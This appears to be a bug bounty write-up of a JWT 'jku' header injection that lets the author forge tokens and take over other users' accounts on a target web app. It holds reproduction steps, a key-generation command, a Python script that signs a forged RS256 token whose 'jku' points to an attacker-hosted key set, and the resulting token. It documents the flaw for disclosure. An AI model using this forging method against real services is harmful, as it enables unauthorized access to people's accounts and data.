[This is an extended version of the actual report that I've submitted in the HackerOne Bug Bounty 2024]

### **Bug Bounty Report**

---

#### **Report Title:**  
JWT Manipulation Vulnerability Leading to Account Takeover  

---

#### **Report Description:**  
I discovered a critical vulnerability in your authentication mechanism that allows an attacker to impersonate other users by manipulating the JSON Web Token (JWT). Specifically, the issue arises due to improper validation of the JWT's signature or key, which enables an attacker to craft a valid token and use it to log in as another user.

Steps to reproduce:  
1. Obtain the public JWK (JSON Web Key) from the application's endpoint at `http://138.197.14.171:31281/.well-known/jwks.json`.  
2. Use the JWK to craft a malicious JWT with the desired payload, such as changing the `username` and `id`.  
3. Sign the JWT using the own generated private key (if exposed) or bypass signature verification (if the application does not validate the signature).  
4. Replace the token in the browser's cookies.  
5. Reload the application to gain unauthorized access as the targeted user.

**Step By Step Process:**
1. I created an account, logged in, found a JWT cookie, decoded it, and found a URL in the `jku` parameter. Sample decode data (header + payload): ```{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "c288afa6-4e05-4981-b976-b0a3460b2450",
  "jku": "http://127.0.0.1:1337/.well-known/jwks.json"
}{
  "id": 10,
  "username": "576i1",
  "iat": 1731733918
}```
2. Replaced the localhost IP with the public IP:PORT of the machine, sent a get request, and got something like this: ```{
  "keys": [
    {
      "alg": "RS256",
      "kty": "RSA",
      "use": "sig",
      "e": "AQAB",
      "n": "ALLBcsvRXr2X4ja7Th/XQa9sHYvqP6nAycbagzJSf1R55tfg/HgCDHxZ5DyzWHABmf5nmiG57ykqfdCFgKQe1XdNnZ2Aji0roY2a3u8YaSE1JnxLUpuIHz4Uld2by/+j0oPY/DuWVANxaY0iyBaVEOJKg4JzCTaG+BMPQiHZ1bJk/gSs4w3v/+95K4/ZKfaZQWrxdcEG4r0hk/YracSwvzuE11Z7u7X16Kp7MhKyWOoJlh7Q7CtCkJBmdXCCrUx7ONIWgG+a0HNQjIJCdGrHQiih3nQTGefCxhvEkfQwPTR5xSd7O0d8mEKfO8BARnzUBCh4ozcRowVeov3Y8plOAK8=",
      "kid": "c288afa6-4e05-4981-b976-b0a3460b2450"
    }
  ]
}```
3. Used this command to create my own jku file `mkkey jwk rsa --kid "c288afa6-4e05-4981-b976-b0a3460b2450" --alg "RS256" --use "sig" > jwk_with_kid.json`. Here the `kid`, `alg`, and `use` keys are the same as the target machine's jku file.
4. Created my own jku file with same formatting as the target machine's one with same `kid`, `alg`, and `use`, except the `e` and `n` value.
5. Hosted the jku file on this repo inside the `.well-known` folder.
6. Generated my fake JWT cookie using the Python script below. Guessed the user id and username from reviews found at `http://138.197.14.171:31281/reviews`.
7. Changed the cookie value with my fake cookie in the browser, refreshed the current webpage at `/dashboard`, and I'm logged in as another user!

Python script I used to generate the fake JWT token:  
```py
import jwt
import json
from jwcrypto import jwk

# Load the JWK with `kid` and `private` key
with open("jwk_with_kid.json", "r") as file:
    jwk_data = json.load(file)

# Extract relevant parts of the JWK
private_jwk = jwk.JWK.from_json(json.dumps(jwk_data["secret"]["jwk"]))
public_jwk = jwk.JWK.from_json(json.dumps(jwk_data["public"]["jwk"]))
kid = jwk_data["public"]["jwk"]["kid"]

# Define the header and payload
header = {
    "alg": "RS256",  # Algorithm
    "typ": "JWT",    # Type
    "kid": kid,       # Key ID
    "jku": "https://raw.githubusercontent.com/MS-Jahan/jwt-poc/refs/heads/main/.well-known/jwks.json"
}

payload = {
    "id": 1,
    "username": "dihan",
    "iat": 1731728697  # Issued At (UNIX Timestamp)
}

# Sign the JWT using the private key
private_key = private_jwk.export_to_pem(private_key=True, password=None).decode()
token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)

# Output the signed JWT
print("Generated JWT:")
print(token)

# Verify the token using the public key
public_key = public_jwk.export_to_pem().decode()
try:
    decoded = jwt.decode(token, public_key, algorithms=["RS256"])
    print("\nDecoded Payload:")
    print(decoded)
except jwt.ExpiredSignatureError:
    print("Token has expired.")
except jwt.InvalidTokenError as e:
    print(f"Invalid Token: {e}")

```
Output:
```
Generated JWT:
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NUy1KYWhhbi9qd3QtcG9jL3JlZnMvaGVhZHMvbWFpbi8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJjMjg4YWZhNi00ZTA1LTQ5ODEtYjk3Ni1iMGEzNDYwYjI0NTAiLCJ0eXAiOiJKV1QifQ.eyJpZCI6MSwidXNlcm5hbWUiOiJkaWhhbiIsImlhdCI6MTczMTcyODY5N30.ayTDiqTVYsmnpnVcKskbDHmkE9lDxGPbcw1QX9pcekqwu7M9qEuJa851pFUGagKgMdEylK1wejw32qudkRoWt5D2xm8567XUsQvNVUDuYQnGqnTBryVMeaR1ceeDwn1YELoRdurVZCQR_GOohbio2JJSUghbgnfdUpvlv9zLJl8X27Fgwpm8JnjnWGJvu-1iTmirpINrDUvEGpCqZT9zSYh-dFugpzXO45HeoT577jYUwG9YMQB6iW3yD4GtddAhTZOZCAZjPIJ5q-Of4QC9xup6mIt8pRAhsy7_NNd2zUUcGXcOLHrvujBWWm08feW0bsGim_pmzvZiTBtFYun4-A

Decoded Payload:
{'id': 1, 'username': 'dihan', 'iat': 1731728697}```
```

---

#### **Impact:**  
This vulnerability allows for:  
- Unauthorized access to any user account.  
- Escalation of privileges, such as accessing admin-only areas.  
- Potential data theft, modification, or deletion.  
- Full control of the application in some cases.

---
##### POC Video Link
https://youtu.be/2zpln4--qmo

#### **Severity:**  
**P1 - Critical**  
This is a critical security flaw as it enables complete account takeover and potential administrative access, violating user trust and system integrity.




